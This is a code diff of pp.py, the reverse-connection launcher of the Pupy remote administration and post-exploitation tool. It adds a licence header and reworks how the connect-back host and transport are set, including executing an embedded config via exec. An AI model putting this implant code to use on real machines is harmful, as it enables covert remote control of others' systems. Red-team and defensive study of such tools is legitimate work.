@@ -1,5 +1,19 @@
 #!/usr/bin/env python
 # -*- coding: UTF8 -*-
+# ---------------------------------------------------------------
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# All rights reserved.
+# 
+# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
+# 
+# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+# 
+# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
+# 
+# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+# 
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
+# ---------------------------------------------------------------
 import site
 import sys
 import time
@@ -79,6 +93,7 @@ def get_next_wait(attempt):
 	else:
 		return random.randint(15,30)
 
+	
 def add_pseudo_pupy_module(HOST):
 	""" add a pseudo pupy module for *nix payloads """
 	if not "pupy" in sys.modules:
@@ -90,9 +105,10 @@ def add_pseudo_pupy_module(HOST):
 		mod.get_connect_back_host=(lambda : HOST)
 		mod.pseudo=True
 
+HOST="127.0.0.1:443"
+TRANSPORT="tcp_ssl"
 def main():
-	HOST="127.0.0.1:443"
-	TRANSPORT="tcp_ssl"
+	global HOST, TRANSPORT
 	if len(sys.argv)>1:
 		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
 		parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default=TRANSPORT, help="the transport to use ! (the server needs to be configured with the same transport) ")
@@ -103,7 +119,9 @@ def main():
 	if "windows" in platform.system().lower():
 		try:
 			import pupy
-			HOST=pupy.get_connect_back_host()
+			config_file=pupy.get_pupy_config()
+			exec config_file in globals()
+			pupy.get_connect_back_host=(lambda: HOST)
 		except ImportError:
 			print "Warning : ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL"
 	else:
